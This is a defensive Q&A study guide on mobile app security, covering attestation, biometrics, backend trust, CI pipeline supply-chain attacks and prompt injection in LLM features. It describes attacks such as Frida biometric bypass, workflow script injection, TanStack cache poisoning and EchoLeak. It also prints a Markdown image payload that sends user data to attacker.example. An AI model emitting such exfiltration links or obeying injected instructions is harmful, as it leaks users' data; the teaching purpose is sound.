**Q: Standard or classic requests?** `[Intermediate]`

Standard, for nearly everything. You prepare a token provider in advance (a few seconds, most under 10 s), and each token then takes a few hundred milliseconds, binds to your request through `requestHash`, and gets replay protection from Google Play automatically. Classic requests take a few seconds, bind to a server-issued `nonce`, and make replay protection **your** job: you issue a single-use nonce and track it. Use classic sparingly, as an extra guarantee on top of standard for the highest-value one-off actions, and take Google's warning literally that you are responsible for implementing it correctly.

*Taught in §9.2.*

**Q: What quotas does Play Integrity have, and which one will you hit first?** `[Intermediate]`

The 10,000-a-day decryption quota is usually the one you hit first: by default you get 10,000 token requests per day (shared between classic requests and standard provider preparations) and 10,000 token decryptions per day, plus 5 classic requests per minute per app instance. Standard token requests after warm-up do not consume the token-request quota, but every token your server decodes consumes a decryption, so decryptions grow with every verification your server runs. Increases go through a Play Console form and can take up to a week, and sudden spikes can be throttled. Ramp large changes gradually and set quota alerts in Google Cloud Console.

*Taught in §9.2.*

**Q: Why did my Play Integrity verdicts suddenly come back empty?** `[Intermediate]`

Most likely something decoded the same token more than once. Google Play prevents a token from being reused many times, and repeated decryption returns cleared verdicts: the device recognition verdict comes back empty, the app recognition and licensing verdicts come back `UNEVALUATED`, and opted-in optional verdicts are cleared too. Google does not say how many decryptions trigger it, so do not rely on "the second one is fine". Look for a retry path, a queue redelivery or a second service decoding a token that was already consumed. Decode once, then pass the parsed verdict along.

*Taught in §9.2.*

**Q: What is the first thing to check in an integrity verdict?** `[Beginner]`

`requestDetails`, before anything else. Confirm the package name, confirm the `requestHash` (standard) or `nonce` (classic) matches the request you are processing, and confirm `timestampMillis` falls inside a short window. If any of those fail, nothing else in the payload means anything. You may be looking at a replayed token from a different request, or one harvested from a different app.

*Taught in §9.1.*

**Q: You have never seen `MEETS_STRONG_INTEGRITY` or `MEETS_BASIC_INTEGRITY` in production. Why?** `[Intermediate]`

Probably because you never opted in: both are optional labels you must enable in Play Console, and by default you get only `MEETS_DEVICE_INTEGRITY` or an empty list. The same applies to `deviceAttributes`, `recentDeviceActivity`, `deviceRecall` (beta) and the whole `environmentDetails` block. Check the opt-in before blaming your install base. Once enabled, `deviceAttributes.sdkVersion` tells you which Android-version rules apply, and `recentDeviceActivity` at `LEVEL_4` (more than 50 standard or 15 classic requests from that device in the last hour) is what a farm replaying one phone looks like.

*Taught in §9.3.*

**Q: A device returns basic integrity but not device integrity. What do you do?** `[Intermediate]`

Raise scrutiny, but do not refuse service by reflex. On Android 13 and later, device integrity requires hardware-backed, positive verified boot (locked bootloader, certified manufacturer OS image), while basic integrity, an opt-in label, only needs Google's platform key attestation root of trust, so rooted and unlocked devices can qualify. Basic-only therefore usually means an unlocked bootloader or a custom OS. Move the session into a higher-risk bucket: allow browsing, require step-up for sensitive actions, cap limits and monitor. Blocking before you have measured your install base's verdict distribution locks out real customers.

*Taught in §9.3.*

**Q: And device integrity without strong integrity?** `[Intermediate]`

Usually a legitimate user whose phone has not had a security update in the last twelve months. Since May 2025, strong integrity on Android 13+ means device integrity plus a security update within a year on both the OS and vendor partitions, which is common to miss on older or regionally supported hardware and entirely outside the user's control. Google estimated the change would cut strong responses by about 14.5%, against about 0.4% for device and basic. Treat strong integrity as a bonus signal for your very highest-risk flows, never as a baseline gate.

*Taught in §9.3.*

**Q: How do you roll out attestation without breaking users?** `[Intermediate]`

Implement without enforcement first, which is also Google's recommended sequence. Log verdicts from your real install base, look at the distribution per label, Android version and country, estimate what each enforcement option would cost, then enforce incrementally from the highest-value flows. When you refuse or restrict, give the user a way out: Play's remediation dialogs (`GET_INTEGRITY` and `GET_STRONG_INTEGRITY` from library 1.5.0, through a single `showDialog` method) let users fix outdated Play services, licensing or integrity problems themselves. Your server chooses the dialog code, because only your server can read the verdict.

*Taught in §9.4.*

**Q: Which user actions deserve an integrity check?** `[Beginner]`

The ones where trust is established or state changes irreversibly: payment, adding a payment method, changing a password or email, deleting the account and initial login. Browsing, search, viewing the cart and viewing a profile do not, because they are low risk, high volume, or already behind authentication. Integrity checks cost quota on Android and rate budget on iOS, so you cannot attest everything. The general rule: if an action is already gated by something you trust, attesting it again buys little.

*Taught in §10.5.*

**Q: What does App Attest prove, and what does it not?** `[Beginner]`

It proves that a key lives in the Secure Enclave of genuine Apple hardware and belongs to your genuine app, so requests signed with it come from your code rather than a patched, re-signed copy. It does not prove who the user is. Apple also says plainly that App Attest cannot definitively pinpoint a device with a compromised operating system: a jailbroken device can still hold a genuine Secure Enclave key. Put it in a risk score alongside authentication, account history, behaviour and velocity.

*Taught in §10.1 and §10.6.*

**Q: Why attest once but assert many times?** `[Beginner]`

Because `attestKey` contacts Apple's servers, while assertions are generated locally with no round trip. You register a key once (Apple's rule is once per key, not per request), then call `generateAssertion` over a hash of each protected request, and your server verifies it with the stored public key. Apple places no limit on assertions per key, but each is a Secure Enclave signature, so keep them off tight loops and hot lifecycle paths. Use one key per user per device, and expect a new key after reinstall, device migration or restore from backup.

*Taught in §10.1.*

**Q: What is the one server-side check people forget in App Attest?** `[Intermediate]`

The assertion counter: track it per key and require it to be strictly increasing. Without it, a captured assertion can be replayed, and you have built a signature check that does not stop the attack it exists to prevent. Make the update atomic (`UPDATE … WHERE counter < :new_counter`, where zero rows updated means replay), or two concurrent requests can both pass. Apple adds that a steady or decreasing counter may indicate a compromised copy of your app that does not know the value your server recorded.

*Taught in §10.2.*

**Q: A returning user's device produces a brand-new App Attest key. Fraud?** `[Intermediate]`

Usually not. Reinstalls, device migrations and restores legitimately produce new keys, and Apple's WWDC26 guidance is explicit: do not reject new keys outright, and do not immediately invalidate a user's older keys either. A backend that treats an unseen key as fraud punishes honest customers for changing phones. Handle it as a re-registration event, scored alongside the fraud metric and the user's key history.

*Taught in §10.3.*

**Q: How should you handle `DCError` from `attestKey`?** `[Advanced]`

On `serverUnavailable`, try again later with the same key; on any other error, discard the key identifier and generate a new key before retrying. Fetch a fresh single-use challenge for each attempt, cap retries, and back off exponentially, which Apple's 2026 session recommends specifically to avoid global rate limits. A small subset of devices is reported to fail with `invalidKey` every time, even with fresh keys and across reinstalls and reboots (about 0.01% of one app's users in a September 2026 forum report, with no reply from Apple), so design a grace mode with elevated scrutiny rather than a lockout. And store the key ID in the Keychain with a `ThisDeviceOnly` class, or a restored backup hands the app a key ID whose key does not exist on the new device.

*Taught in §10.4.*

**Q: What rate limits does App Attest have?** `[Intermediate]`

Apple documents them: keep `attestKey()` calls below roughly 100 per second across all installations, and ramp a rollout gradually, at no more than 10 million users per day per app. The threshold can fluctuate, so be ready to pull back. After rollout, only new users, new devices and reinstalls attest, which Apple says should not cause throttling. Assertions have no per-key limit, and no daily quota, SLA or increase process is published.

*Taught in §10.5.*

**Q: What is actually new in App Attest for 2026?** `[Intermediate]`

Two signals on iOS 27 and support on macOS 27. On iOS 27, a new `extensions` structure in the authenticator data carries the app's launch validation category and bundle version. On macOS 27, App Attest works on the Mac for the first time, and the leaf certificate carries the key's access-control property. The fraud metric is **not** new, despite how it is often summarised: it dates from WWDC21. WWDC26 Session 201 is the current reference, and it adds operational guidance: do not reject new keys outright, treat an unexpected `isSupported == false` as a possible tampering signal, and let your server control when attestation starts.

*Taught in §10.3.*

**Q: Your App Store app sends an iOS 27 attestation reporting a TestFlight launch category. What does that tell you?** `[Advanced]`

That the app is running somewhere you did not ship it. The iOS 27 `extensions` carry the launch validation category and the bundle version, so a mismatch with how you actually distributed the build, or a bundle version you never released, is direct evidence of an unexpected copy. Validate these fields in your attestation checks alongside the certificate chain, nonce, `RP ID` hash, counter and `aaguid`. Feed the result into your risk score rather than treating it in isolation.

*Taught in §10.2 and §10.3.*

**Q: What is App Attest's fraud metric, and how do you use it?** `[Advanced]`

It is an approximate count of attested keys for your app on one device over the past 30 days, which Apple's documentation calls the risk metric. Your server sends the attestation receipt to Apple's server-to-server endpoint and receives a fresh receipt containing it; a high number suggests one device serving many modified instances. You can refresh a receipt only after its "not before" date and must do so before it expires, so fetch it on a schedule. Apple's 2026 advice is to treat it as an investigation signal, not a reason to block.

*Taught in §10.3.*

**Q: Rootless jailbreaks and Frida 17 keep breaking our client-side checks. Should we stop doing them?** `[Advanced]`

Keep them, but treat them as reported signals and lean on attestation for anything you must trust. Current jailbreaks such as Dopamine are rootless and install under `/var/jb`, so detectors that look only for `/Applications/Cydia.app` report a clean device on exactly the jailbreaks in use; systemless Android roots (Magisk, KernelSU, APatch) hide from `su` checks in the same way. Frida 17 moved its language bridges out of the core runtime, which breaks many older test scripts, so pin tool versions in your test lab. Send whatever you detect to the backend, bound to a Play Integrity token or App Attest assertion for the same request: the attacker can suppress a client signal, but an empty signal list from a device that fails attestation is itself a signal.

*Taught in §13.2, §14.2 and §14.4.*

## Biometrics

**Q: How do you implement biometrics so they cannot be bypassed?** `[Intermediate]`

Tie the prompt to a cryptographic operation. If you only branch on the success callback, an attacker with Frida calls that callback without any biometric happening, and the bypass takes minutes (`MASWE-0020`). On Android, use `BiometricPrompt` with a `CryptoObject` wrapping a Keystore key created with `setUserAuthenticationRequired(true)`, then sign or decrypt something with it; KeyMint only uses the key after it sees a hardware authentication token from the biometric component in the TEE. On iOS, use a Secure Enclave key whose `SecAccessControl` requires biometry, whose access control is evaluated inside the Enclave. A hooked callback can make your UI say "authenticated", but it cannot produce the signature.

*Taught in §11.1.*

**Q: Should the biometric-bound key be an EC signing key or an AES key?** `[Intermediate]`

An EC signing key whenever your server needs to verify the result, and AES only for protecting local data. A Keystore AES key never leaves the device, so your server could never check anything it produced. Create the EC key at enrolment, register its public key (ideally with its key attestation chain, so the server can confirm it is hardware-backed and authentication-bound), then sign a server-issued challenge plus the transaction details and verify on the server. When the protected thing is local, such as a stored refresh token, an AES-GCM key with the same authentication settings passed as a `Cipher` in the `CryptoObject` works for the same reason.

*Taught in §11.6.*

**Q: Why does Class 3 matter?** `[Beginner]`

Class 3 (`BIOMETRIC_STRONG`) is the only Android tier strong enough to gate Keystore keys, which makes it the only tier that can back a `CryptoObject`. Class 2 (`BIOMETRIC_WEAK`) accepts weaker modalities, and requesting crypto-based authentication with it fails. Accepting Class 2 for a payment means accepting a modality the platform itself considers insufficient to protect a key. `MASTG-BEST-0031` says the same.

*Taught in §11.2.*

**Q: An attacker steals an unlocked phone and adds their fingerprint. What stops them?** `[Intermediate]`

Invalidating biometric-bound keys when the enrolled set changes. On Android, `setInvalidatedByBiometricEnrollment(true)` is already the default, but only for keys that require authentication on every use and accept biometrics only; the key then throws `KeyPermanentlyInvalidatedException` after a new enrolment. On iOS, use `.biometryCurrentSet`, never `.biometryAny`. The trap: adding `AUTH_DEVICE_CREDENTIAL` to the key, or a positive validity duration, silently switches enrolment invalidation off, which `MASTG-TEST-0326` (device-credential fallback), `MASTG-TEST-0328` (enrolment invalidation) and `MASTG-TEST-0330` (validity duration) look for. OS features such as Stolen Device Protection and Identity Check help but can be off and trust "familiar" places, so keep your own invalidation (`MASWE-0022`) and accept that legitimate re-enrolment forces re-registration in your app.

*Taught in §11.3.*

**Q: How do you provide a fallback without creating a bypass?** `[Intermediate]`

Make it equivalent in strength, and be honest about what that means. A device PIN that unlocks the same hardware key is a real cryptographic check, but it is exactly as strong as the PIN, the thief who watched you type it already has it, and on Android accepting the device credential on the key disables enrolment invalidation. Accept that for moderate-risk actions. For high-value ones, fall back to server-side step-up: the account password, a passkey, or a one-time code to a channel registered earlier. A fallback that sets `authenticated = true` is the vulnerability with a friendlier label, which is what `MASWE-0021` names.

*Taught in §11.4.*

**Q: Should a face scan authorise a transfer the moment the user glances at the phone?** `[Intermediate]`

No: require explicit user confirmation for high-value actions. Passive face recognition that approves a payment on a glance is a usability decision with a security consequence, and `MASTG-BEST-0038` covers it. On Android, keep `setConfirmationRequired(true)`, the default, in `PromptInfo`.

*Taught in §11.4.*

**Q: When should you not require biometrics?** `[Beginner]`

On every cold start, for browsing or reading, or for anything a user does twenty times a day. Spend the friction on payments and transfers, adding a payee, changing a password or email, viewing full card details, disabling security features and high-value account changes. Friction that does not buy security gets routed around: users disable the feature, choose a weaker option or abandon the flow, which leaves you less secure than before. This is a security argument, not a UX concession.

*Taught in §11.5.*

**Q: How can an iOS app explain why the user must re-enrol after a biometric change?** `[Advanced]`

Compare the biometric state across launches with `LAContext.domainState.biometry.stateHash` (iOS 18 and later), which replaces the deprecated `evaluatedPolicyDomainState`. If the hash changed, you can tell the user their Face ID or Touch ID set changed and that is why the app needs them to sign in again. Treat it as a UX hint only: the `.biometryCurrentSet` access control on the Keychain item is what enforces.

*Taught in §11.3.*

**Q: How do you test your own biometric implementation?** `[Intermediate]`

Attack it the way an attacker would. Run a callback-bypass Frida script against a debug build and check whether the protected action completes; if it does, the prompt is decorative. Grep for `onAuthenticationSucceeded` and confirm each body uses `result.cryptoObject`, with a key that has no `AUTH_DEVICE_CREDENTIAL` and no validity duration. Then add a new fingerprint or alternate Face ID appearance and use the feature again: the pass condition is `KeyPermanentlyInvalidatedException` on Android or a signing failure on iOS, handled as a re-registration prompt.

*Taught in §11.6.*

**Q: When should you use passkeys instead of your own biometric-bound key?** `[Intermediate]`

For sign-in. Passkeys are FIDO2/WebAuthn credentials: the device creates a key pair per site, your server stores the public key, and at sign-in the user unlocks the private key with a biometric or device PIN to sign your server's challenge. That is the same pattern as a biometric-bound signing key, standardised, and phishing-resistant because the credential is bound to your domain. Use Credential Manager (`androidx.credentials`) on Android and `AuthenticationServices` on iOS. Because passkeys can sync through the user's password manager, they prove "this user", not "this device", so pair them with attestation when you also need to know the device.

*Taught in §11.7.*

## Backend

**Q: What is the one test for any authenticated endpoint?** `[Beginner]`

Ask: if an attacker replays a valid request from a different device, what stops them? If the answer is "nothing", that is your next piece of work, and it matters more than anything on the client. Token binding, attestation assertions, and nonce or counter checks are the three mechanisms that answer the question properly. Write the answer down for your three highest-value endpoints first.

*Taught in §12.4.*

**Q: What should never be trusted from the client?** `[Beginner]`

Identity claims, prices, quantities, entitlements, balances, permissions, discounts and limits. The client proposes; the server decides. Derive the acting user from the session token, never from a body field: `{"userId": 12345}` is a suggestion. A request can carry a valid session and a perfect integrity verdict and still have had its price edited in a proxy before it left the phone, so if your API accepts a price from the client, you do not have a pricing bug, you have a free store.

*Taught in §12.1.*

**Q: What is the difference between a bearer token and a sender-constrained one, and why does it matter?** `[Intermediate]`

A bearer token works for whoever holds it, from anywhere; a sender-constrained token works only alongside proof of a key the legitimate client holds. For OAuth that means DPoP (RFC 9449), where each request carries a proof signed by a device key, or mutual TLS (RFC 8705). App Attest assertions and biometric-bound signatures give the same effect for individual requests. Put the key in hardware and a stolen token is useless off the device, which devalues a whole category of attack in one measure.

*Taught in §12.1 and §12.6.*

**Q: Why rate limit per account and per device rather than per IP?** `[Beginner]`

Because IP-based limiting is defeated by any residential proxy pool, which costs an attacker very little. Limits keyed to the account and the device follow the attacker however many addresses they rotate through. Log each security decision with enough context to investigate later (who, which device, when, and why), but never log the token or secret that was presented.

*Taught in §12.1.*

**Q: Why build a risk score instead of just allowing or blocking?** `[Intermediate]`

Because a single binary signal is a single point of failure: when it is defeated, and hardware attestation can be defeated with leaked keyboxes or relayed chains, you have nothing. A score degrades gracefully, because the other inputs (account age, device history, velocity, geography, transaction size, time since last authentication) still discriminate. It also gives you proportionate responses: allow silently, allow with step-up, allow with a lower limit, flag for review, queue for manual review, refuse. Most fraud is better handled in the middle, where you impose cost on the attacker without punishing false positives, and both Google and Apple now say the same about their own verdicts.

*Taught in §12.2 and §5.4.*

**Q: How should a risk score weight root detection against an integrity verdict?** `[Intermediate]`

Weight the server-verified verdict heavily and the client-reported flags lightly. A Play Integrity verdict reaches you from Google and an App Attest assertion is verified on your server, so the attacker cannot forge them; `rootDetected = false` comes from a client the attacker may be running under Frida. Root detection carries a low weight on purpose, because rooted devices are common and often legitimate, and heavy weighting punishes power users while missing fraud. Treat missing evidence as a failed check, or an attacker simply strips the token. Then tune the weights against confirmed fraud outcomes: an untested score is a guess with arithmetic on top.

*Taught in §12.5.*

**Q: What is a Backend-for-Frontend, and when do you need one?** `[Intermediate]`

A BFF is a thin backend layer between your app and everything else that holds every sensitive secret and makes every trust decision. The app authenticates to it with short-lived, ideally sender-constrained tokens; the BFF validates, rate-limits and verifies integrity evidence, then calls payment providers and third-party APIs with keys that never ship in the app, and those keys rotate without a store release. You need one when you talk to third-party APIs, take payments or handle authentication, which is most apps. The cost is another service to build, secure and monitor, plus a network hop; the test is whether any third-party key currently in your client is one you wish were not.

*Taught in §12.3.*

**Q: What is an impossible-travel check, and how do you stop it flagging commuters?** `[Intermediate]`

It flags an account that moved faster than is physically possible between two sessions, roughly faster than a commercial flight. Use backend-side IP geolocation rather than device GPS: it needs no permission, a user cannot spoof it casually, and it keeps you out of a location-data declaration. IP geolocation can be off by hundreds of kilometres and carriers route through distant gateways, so ignore small jumps with a noise threshold. VPNs will still trip it, so feed the result into the score rather than blocking on it.

*Taught in §12.5.*

## Pipeline

**Q: Why pin GitHub Actions to a commit SHA rather than a tag?** `[Beginner]`

Because tags are mutable and a full-length commit SHA is not. In March 2025 the `tj-actions/changed-files` tags were repointed to a malicious commit that dumped runner secrets into workflow logs, public on public repositories, across a user base of over 23,000 repositories; in March 2026, 76 of 77 `aquasecurity/trivy-action` tags were force-pushed to code that harvested CI secrets. Pin to the SHA with the version in a trailing comment. Nothing checks that comment, so let a tool such as `pinact` write both, or resolve the SHA yourself with `git ls-remote --tags` rather than copying it from a blog.

*Taught in §15.1 and §15.3.*

**Q: How do you enforce SHA pinning across an organisation?** `[Intermediate]`

Turn on GitHub's allowed-actions policy setting **Require actions to be pinned to a full-length commit SHA**, available since August 2025 at enterprise, organisation and repository level. The same policy accepts `!` entries that block a named action outright, which is your fast response when an action is compromised. Immutable releases (generally available since October 2025) stop an author's release tag and assets changing, but only for authors who turned them on, so pin anyway. Policy in settings matters because automated attacks outrun review: Megalodon pushed 5,718 malicious workflow commits in about six hours.

*Taught in §15.1 and §15.3.*

**Q: Why add a cooldown to Dependabot, and what is the default?** `[Intermediate]`

Because compromised releases are usually caught in the first days after publication, and a cooldown keeps you from adopting one in that window. Since July 2026 Dependabot applies a three-day default cooldown to version updates; security updates are not delayed. Set a longer one explicitly for actions, for example `cooldown: default-days: 7` under the `github-actions` ecosystem, which supports `default-days` only. Group minor and patch updates so the pull requests stay reviewable.

*Taught in §15.3.*

**Q: What should `GITHUB_TOKEN` be allowed to do by default?** `[Beginner]`

Nothing. Set `permissions: {}` at workflow level and grant the minimum per job, such as `contents: read` for a build. Only enterprises, organisations and personal repositories created since 2 February 2023 default to a read-only token; existing ones kept their old setting and repositories inherit their organisation's, so an older organisation may still hand every workflow a read-write token. Check *Settings → Actions → General* rather than assuming, and set `persist-credentials: false` on checkout so the token is not left in `.git/config`.

*Taught in §15.3.*

**Q: Your CI has a stored AWS key. What replaces it, and why?** `[Intermediate]`

OIDC. A stored key is valid indefinitely and portable the moment it leaks; an OIDC token is issued for a single job and expires within minutes, and your cloud provider exchanges it for temporary credentials. AWS, Azure and Google Cloud all support it. Scope the cloud-side trust policy to the repository, branch and environment, never the whole organisation. For registries, use trusted publishing (npm since July 2025, and PyPI) scoped to the exact workflow filename. Remember TanStack, though: short-lived credentials limit how long a stolen token is useful, not whether code running inside your release job can use it.

*Taught in §15.1 and §15.3.*

**Q: What is script injection in a workflow?** `[Intermediate]`

Attacker-controlled text, such as a PR title, issue body, branch name or commit message, expanded by `${{ }}` into a `run:` block, where it becomes part of your shell script. GitHub expands the expression before the shell runs, so a PR titled with a quote and a `curl … | sh` executes. It is how Ultralytics (a branch name) and Nx (a PR title) fell. Pass untrusted values through `env:` and quote them, never inline `${{ github.event.* }}` into a shell step, and run `actionlint` and `zizmor` in CI to catch it mechanically.

*Taught in §15.1 and §15.3.*

**Q: What is wrong with `pull_request_target`?** `[Intermediate]`

It runs in the context of your base repository, with your secrets and a token that can write, even when the pull request comes from a fork. It is the Ultralytics, Nx and TanStack vector. In the May 2026 TanStack attack, a bundle-size check on `pull_request_target` built the fork's code and saved a poisoned pnpm store into the Actions cache; just under eight hours later the legitimate release workflow restored it, read the job's OIDC token out of the runner's memory, and published 84 malicious versions across 42 packages. If you need the trigger, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow consumes.

*Taught in §15.1 and §15.3.*

**Q: GitHub has tightened `pull_request_target`. Are you safe now?** `[Advanced]`

Safer, not safe. Since 8 December 2025 the workflow definition always comes from the default branch; since mid-2026 `actions/checkout` (v7 from June, backported in July) refuses to check out a fork's code in `pull_request_target` or `workflow_run` unless you set `allow-unsafe-pr-checkout`; and from 2 November 2026 a default workflow execution protections rule disables `pull_request_target` in public repositories unless you opt back in. TanStack fell after the first change, because its workflow deliberately built the fork's code, and an opt-out or an old checkout pin undoes the second. Audit every use of the trigger yourself.

*Taught in §15.3.*

**Q: How do you stop a poisoned cache reaching your release build?** `[Advanced]`

Treat the cache as a build input and, for release builds, restore no shared cache at all. GitHub's current rules help: only trusted triggers such as `push`, `schedule` and `workflow_dispatch` can write the default-branch caches every branch reads, `pull_request_target` runs may only read them, and `cache-mode` (generally available since September 2026) makes each job's access explicit. Do not assume those rules applied when your existing caches were written. In the release job, set `cache-disabled: true` on `setup-gradle` or its equivalent: a slower release is cheaper than a poisoned one.

*Taught in §15.4 and §15.6.*

**Q: "We have SLSA provenance, so our supply chain is verified." Respond.** `[Advanced]`

Provenance attests to the process, not to the cleanliness of the inputs. In the TanStack attack of May 2026 the malicious packages carried valid, signed SLSA provenance and verification reported them genuine *(reported by Snyk and StepSecurity)*, because the build really did run on the declared platform, from the declared repository, through the declared workflow; it simply restored a poisoned cache. Build L3's isolation stops one run tampering with another, but a cache your own workflow chooses to restore is an input you accepted. Provenance closes the substitution attack, meaning an artifact that did not come from your build; you still need controls on what enters the build, including treating caches as inputs.

*Taught in §15.4 and §15.5.*

**Q: Why lock dependencies and enable Gradle dependency verification?** `[Intermediate]`

An unlocked build silently resolves a different version a month later and nobody notices; verification with checksums makes a swapped artifact fail the build rather than ship. Commit `gradle.lockfile`, `Gemfile.lock` and `Package.resolved`, and commit `gradle/verification-metadata.xml` and review changes to it like code. Pin the toolchain too: `distributionSha256Sum` for the Gradle wrapper, a fixed JDK and a pinned fastlane. Both are cheap and both close a class of attack that requires no code change to review.

*Taught in §15.4.*

**Q: An attacker steals your Android upload key. How bad is it?** `[Intermediate]`

Recoverable, if you use Play App Signing. Google holds the app signing key that users' devices check on every update, and your upload key only proves to Google that an upload came from you, so a thief still cannot produce an update devices will accept without also getting into your Play Console account. Ask Google to reset it (*Request upload key reset* on the app-signing page) and register a new one. Without the split, a stolen signing key lets an attacker sign updates that install over yours through any sideloading channel, and you cannot take it back. Play App Signing has been required for new apps since August 2021.

*Taught in §15.6.*

**Q: What does Android developer verification mean for your release process?** `[Intermediate]`

It makes your developer identity, and so your Play Console account, part of what lets your app install at all. From 30 September 2026, certified devices running Android 7 or later in Brazil, Indonesia, Singapore and Thailand require apps installed from participating stores (Google Play plus six partner stores: HONOR App Market, OPPO App Market, Galaxy Store, Palm Store, V-Appstore and GetApps) to be registered by a verified developer. In 2027 this expands globally to all apps on certified devices, sideloaded ones included, with an "advanced flow" that lets power users install unverified apps. Google says Play registers 99% of apps automatically. Guard the Play Console account as closely as your keys.

*Taught in Chapter 0.4 and §15.6.*

**Q: How do you get a keystore into CI safely?** `[Intermediate]`

Base64-encode the upload keystore into the CI secret store (or encrypt it in the repository with the passphrase in the secret store), decode it at build time to a temporary path such as `$RUNNER_TEMP`, and delete it in an `if: always()` step. Never commit `key.properties` or a `gradle.properties` containing passwords; a leaked signing password has the same blast radius as a leaked server key. Make the build fail when release signing is missing rather than silently producing an artifact the store rejects, or one signed with a key nobody meant to use.

*Taught in §15.6.*

**Q: How should iOS signing work in CI?** `[Intermediate]`

Use `fastlane match` or Xcode Cloud's managed signing, and authenticate with an App Store Connect API key rather than an Apple ID. `match` keeps certificates and profiles encrypted in a private store, installs them into a temporary keychain for the build and cleans up afterwards. The API key avoids interactive two-factor prompts, carries a role you choose and can be revoked without touching anyone's account. Use a team key, which an Admin creates, because individual keys cannot call the provisioning endpoints `match` needs. Apple re-signs App Store builds, so the attacker's real prize is your App Store Connect access rather than your distribution certificate.

*Taught in §15.6.*

**Q: How do you stop a compromised workflow from shipping to production?** `[Intermediate]`

Put the release job behind a GitHub environment with required reviewers, so a production upload needs a human approval a compromised workflow cannot give itself. Give store service accounts the minimum role: a key that can publish to production when it only needs the internal track is standing risk for no benefit. Add a `CODEOWNERS` entry for `.github/workflows/` with required code-owner approval, so nobody with write access can quietly change what runs with your secrets. Keep releases auditable: tag the commit, record the workflow run, and retain the build log and provenance.

*Taught in §15.3 and §15.6.*

**Q: A production API key was committed six months ago. First move?** `[Beginner]`

Rotate the credential. Not remove the commit: rotate. Deleting the commit does not un-leak it, and you should assume it was harvested within minutes of the push. More than 64% of secrets GitGuardian confirmed valid in 2022 were still valid when retested in January 2026, which tells you how rarely teams do this. Then purge history, add blocking push-time scanning, and check access logs for use of the old key.

*Taught in §2.2 and §15.2.*

**Q: Two monitoring alerts that would have caught real 2025 attacks?** `[Intermediate]`

New self-hosted runner registrations and new repository creation in your organisation. The second wave of Shai-Hulud (November 2025) registered infected machines as self-hosted runners named `SHA1HULUD` and dumped stolen credentials into tens of thousands of public repositories. Prefer ephemeral GitHub-hosted runners, and never let self-hosted runners pick up jobs from public-repository pull requests.

*Taught in §15.1 and §15.3.*

**Q: Does AI-assisted coding change your secrets posture?** `[Intermediate]`

Yes: commit-time scanning becomes load-bearing rather than optional. GitGuardian's 2026 report found that public commits co-authored by one AI coding assistant, Claude Code, leaked secrets at 3.2%, against a 1.5% baseline across all public commits; eight of the ten fastest-growing leaked-secret categories were AI-related; and MCP configuration files alone exposed 24,008 unique secrets, partly because popular setup guides tell you to paste keys into them. Treat the 3.2% as evidence about one tool, not a figure for all AI tools, and audit MCP configs specifically, because many scanning setups were not built with them in mind.

*Taught in §2.2 and §15.2.*

**Q: Where do secrets leak from now?** `[Intermediate]`

Increasingly from CI/CD runners and collaboration tools such as Slack, Jira and Confluence, rather than from developer laptops or source code. In the Shai-Hulud 2 dataset GitGuardian analysed, 59% of compromised machines were CI/CD runners, and about 28% of secret incidents originated entirely outside code repositories, in Slack, Jira and Confluence, where they were 13 percentage points more likely to be rated critical. Scan those tools too, and harden runners as carefully as laptops.

*Taught in §2.2.*

**Q: What should you check on the artifact before it ships?** `[Beginner]`

The release build itself, in an automated release-gate job. Run `strings` and a decompiler on it, confirm `debuggable` is false, logging is stripped and no debug network configuration survived, and confirm it is signed with the expected key. Diff the dependency tree against the previous release and question anything new. A perfect pipeline can still produce a bad artifact.

*Taught in §15.7.*

## AI features

**Q: What is indirect prompt injection?** `[Beginner]`

It is an attack where instructions reach a language model through content it reads, not through anything the user typed. The payload sits in a scanned document, a shared file, a web page, an email or a calendar entry, and a model with tool access may act on it. EchoLeak (CVE-2025-32711) in Microsoft 365 Copilot is the reference case: an ordinary-looking email made Copilot leak internal data when the user later asked it something unrelated, with no click required. Apple described the same shape for apps at WWDC26, with a crafted calendar event steering an agent into paying, posting or deleting.

*Taught in §20.1.*

**Q: You are adding an LLM assistant to a banking app. What are your first three security questions?** `[Intermediate]`

First, if the user can influence the prompt, what can the prompt influence, especially if the model can call tools? Second, what user data leaves the device, and does that break a commitment you have made to a regulator or under GDPR? Third, where does the model key live, and what stops a script from spending your inference budget? Treat the model's output exactly as you treat WebView content: untrusted, validated before it reaches anything that changes state. The second question needs whoever owns your regulatory commitments in the room before you ship, and the third is answered by a backend proxy that authenticates, attests and rate-limits.

*Taught in §20.1, §20.2 and §20.3.*

**Q: Why is prompt injection a mobile problem rather than just a backend one?** `[Intermediate]`

Because the mobile client is where untrusted content enters your system: the camera, the share sheet, the clipboard, a WebView, the file picker. If that content reaches a model with tool access, you have a new execution path that your input validation, designed for form fields, was never built to catch. Indirect injection arrives in what the model reads, not in what the user typed. That is why each tool or App Intent should be treated as an exported entry point, exactly like an exported activity.

*Taught in §20.1.*

**Q: What is the difference between prompt-level and action-level mitigations, and which ones hold?** `[Intermediate]`

Prompt-level mitigations reduce the chance the model is fooled; action-level mitigations limit the damage when it is, and only the latter are deterministic. Prompt-level means keeping sensitive data out of the context and spotlighting, which wraps untrusted content in delimiters telling the model it is data. Apple is explicit that spotlighting is probabilistic and a clever injection can defeat it. Action-level means user confirmation before any tool with side effects (money, messages, posting, deletion), requiring an unlocked device for sensitive actions, and least-privilege tools. On Apple platforms that is `authenticationPolicy` and `requestConfirmation()` on your App Intents.

*Taught in §20.1.*

**Q: Why should you not render model output as Markdown?** `[Advanced]`

Because an injected instruction can make the model emit an image link that carries your user's data to an attacker's host. Output such as `![](https://attacker.example/?d=<data>)` causes your app to fetch the "image" and deliver the data in the URL, with no click and no tool call. Render model output as plain text, or allowlist the hosts images may load from. This is OWASP's LLM10, Improper Output Handling, and the WebView rules from Chapter 16 apply to the same content.

*Taught in §20.1.*

**Q: What changed in the OWASP Top 10 for LLM Applications 2026 edition?** `[Intermediate]`

Prompt injection and sensitive information disclosure stayed at LLM01 and LLM02, excessive agency rose to third, unbounded consumption rose to sixth, and System Prompt Leakage was broadened into "Hidden Context Exposure" at LLM08. The edition was published in August 2026; the ranking is as reported in OWASP's release coverage. The movements track real incidents: agents with more tools, reasoning models that make abuse more expensive, and wrong answers driving real decisions (LLM07, Misinformation). For autonomous agents, OWASP keeps a separate Top 10 for Agentic Applications.

*Taught in §20.1, §20.4 and §20.5.*

**Q: Can you keep a secret in the system prompt?** `[Beginner]`

No: anything in the model's context can be coaxed back out. That is LLM08, Hidden Context Exposure, in the 2026 list. Never put credentials, internal URLs or authorisation rules in a prompt and rely on the model to keep them. Authorisation belongs in ordinary code on your server, where the model cannot talk its way past it.

